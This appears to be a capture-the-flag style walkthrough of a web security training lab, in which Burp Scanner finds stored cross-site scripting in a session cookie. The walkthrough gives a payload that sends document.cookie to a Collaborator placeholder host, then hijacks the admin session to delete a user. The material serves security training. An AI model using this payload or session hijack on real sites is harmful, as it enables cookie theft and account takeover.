---
description: >-
  This lab contains a vulnerability that is difficult to find manually. It is
  located in a non-standard data structure.
---

# Lab: Scanning non-standard data structures

Let's Start !!

<figure><img src="../../../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

Find the `GET /my-account?id=wiener` request, which contains your new authenticated session cookie

* Select the first part of the session cookie, the cleartext `wiener`.
* Right-click and select **Scan selected insertion point**, then click **OK**.

<figure><img src="../../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

Approximately one minute after the scan starts, notice that Burp Scanner reports a **Cross-site scripting (stored)** issue. It has detected this by triggering an interaction with the Burp Collaborator server.

<figure><img src="../../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner used with an exploit that exfiltrates the victim's cookies. For example:

```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

<figure><img src="../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

Go back to the **Collaborator** tab. After approximately one minute, click **Poll now**. Notice that the Collaborator server has received new DNS and HTTP interactions.

<figure><img src="../../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

Change The Admin Cookie !!

<figure><img src="../../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

Now We Have a acces of Admin !!

<figure><img src="../../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

Then We Delete The Carlos To Solve The Lab !!

<figure><img src="../../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

Lab is Solved !!

<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
